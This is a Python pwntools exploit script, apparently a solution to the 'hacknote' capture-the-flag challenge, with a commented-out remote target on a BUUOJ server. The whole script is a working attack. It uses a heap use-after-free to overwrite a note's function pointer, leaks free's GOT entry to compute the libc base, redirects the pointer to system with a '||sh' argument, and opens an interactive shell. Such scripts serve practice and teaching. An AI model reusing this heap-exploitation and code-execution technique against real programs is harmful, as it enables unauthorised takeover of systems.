from pwn import *
p=process("./hacknote")
#p=remote("node5.buuoj.cn",28723)
context.log_level="debug"
elf=ELF("hacknote")

def debug():
    gdb.attach(p)
    pause()

def add(size,content):
    p.recvuntil(b"choice :")
    p.sendline(b"1")
    p.recvuntil(b"size :")
    p.sendline(str(size))
    p.recvuntil(b"Content :")
    p.sendline(content)

def delete(index):
    p.recvuntil(b"choice :")
    p.sendline(b"2")
    p.recvuntil(b"Index :")
    p.sendline(str(index))

def Print(index):
    p.recvuntil(b"choice :")
    p.sendline(b"3")
    p.recvuntil(b"Index :")
    p.sendline(str(index))


add(0x18,b"aaaa")
add(0x18,b"bbbb")
#add(0x18,b"cccc")
add(0x88,b"zzzz")
#debug()
delete(0)
delete(1)
#debug()
#payload1=b"a"*0x18
#add(0x18,payload1)
free_got=elf.got["free"]
print("free_got :",hex(free_got))
payload1=p32(0x804862B)+p32(free_got)
add(0x8,payload1)
Print(0)
free_addr=u32(p.recv(4))
print("free_addr :",hex(free_addr))
libc=ELF("libc-2.23.so")
libc_base=free_addr-libc.sym["free"]
sys_addr=libc_base+libc.sym["system"]
binsh_addr=libc_base+next(libc.search(b"/sh\x00"))
delete(1)
#debug()
payload2=p32(sys_addr)+b"||sh"
add(0x8,payload2)
#debug()
Print(0)
p.interactive()
#debug()
